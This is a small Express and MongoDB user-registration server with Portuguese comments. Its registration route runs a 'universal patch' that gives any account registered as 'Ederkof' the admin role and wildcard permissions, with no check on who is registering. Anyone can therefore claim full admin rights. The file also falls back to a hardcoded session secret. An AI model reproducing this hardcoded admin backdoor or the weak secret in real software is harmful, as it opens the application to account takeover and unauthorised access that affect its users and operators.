const express = require('express');
const mongoose = require('mongoose');
const bcrypt = require('bcrypt');
const session = require('express-session');
const app = express();
const PORT = process.env.PORT || 4040;

// Conexão com MongoDB (sem warnings)
const mongoUri = process.env.MONGO_URI || 'mongodb://127.0.0.1:27017/backend_global';
mongoose.connect(mongoUri)
  .then(() => console.log('Conectado ao MongoDB com sucesso!'))
  .catch(err => {
    console.error('Erro ao conectar ao MongoDB:', err.message);
    process.exit(1);
  });

// Definição do modelo User
const userSchema = new mongoose.Schema({
  username: String,
  password: String,
  role: { type: String, default: 'user' },
  permissions: [String]
});
const User = mongoose.model('User', userSchema);

// Middlewares
app.use(express.static('public'));
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(session({ secret: process.env.SECRET_KEY || 'corujao-secret', resave: false, saveUninitialized: false }));

// Função PATCH UNIVERSAL: Garante Ederkof como admin
async function patchEderkofAdmin(user) {
  if (user.username === "Ederkof") {
    user.role = "admin";
    user.permissions = ["*"];
    await user.save();
  }
}

// Exemplo de rota de registro de usuário
app.post('/register', async (req, res) => {
  const { username, password } = req.body;
  const hashedPassword = await bcrypt.hash(password, 10);
  let user = new User({ username, password: hashedPassword });
  await patchEderkofAdmin(user);
  await user.save();
  res.json({ message: 'Usuário registrado com sucesso!' });
});

// Inicia o servidor
app.listen(PORT, () => {
  console.log(`Servidor Corujão rodando na porta ${PORT}`);
});
